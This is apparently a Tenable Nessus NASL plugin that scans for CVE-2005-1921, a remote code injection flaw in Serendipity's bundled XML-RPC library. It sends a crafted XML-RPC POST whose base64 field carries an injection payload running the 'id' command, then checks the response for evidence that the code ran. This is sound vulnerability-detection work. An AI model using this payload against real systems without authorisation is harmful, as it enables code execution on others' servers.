#
# (C) Tenable Network Security
#


if (description) {
  script_id(18600);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-1921");
  script_bugtraq_id(14088);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"17793");

  name["english"] = "Serendipity XML-RPC for PHP Remote Code Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to a remote
code injection attack. 

Description :

The version of Serendipity installed on the remote host is prone to
remote code execution due to a failure of its bundled XML-RPC library
to sanitize user-supplied input to the 'serendipity_xmlrpc.php'
script.  This flaw may allow attackers to execute code remotely
subject to the privileges of the web server userid. 

See also : 

http://archives.neohapsis.com/archives/bugtraq/2005-06/0283.html
http://www.hardened-php.net/advisory-022005.php
http://blog.s9y.org/archives/36-CRITICAL-BUGFIX-RELEASE-Serendipity-0.8.2.html

Solution : 

Upgrade to Serendipity version 0.8.2 or later. 

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for XML-RPC for PHP remote code injection vulnerability in Serendipity";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("serendipity_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/serendipity"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script exists.
  req = http_get(item:string(dir, "/serendipity_xmlrpc.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("XML error: no element found at line 1" >< res) {
    # Try to exploit the flaw.
    postdata = string(
      '<?xml version="1.0"?>',
      "<methodCall>",
      "<methodName>blogger.getUsersBlogs</methodName>",
        "<params>",
          "<param><value><string>nessus</string></value></param>",
          "<param><value><string>", SCRIPT_NAME, "</string></value></param>",
          # nb: the actual command doesn't matter for our purposes: it
          #     will just be used for the password (base64 decoded :-).
          "<param><value><base64>'.`id`.'</base64></value></param>",
        "</params>",
      "</methodCall>"
    );
    req = string(
      "POST ", dir, "/serendipity_xmlrpc.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: text/xml\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);
     # There's a problem if we see the code in the XML debug output.
    if ("base64_decode(''.`id`.'')" >< res) {
      security_hole(port);
      exit(0);
    }
  }
}
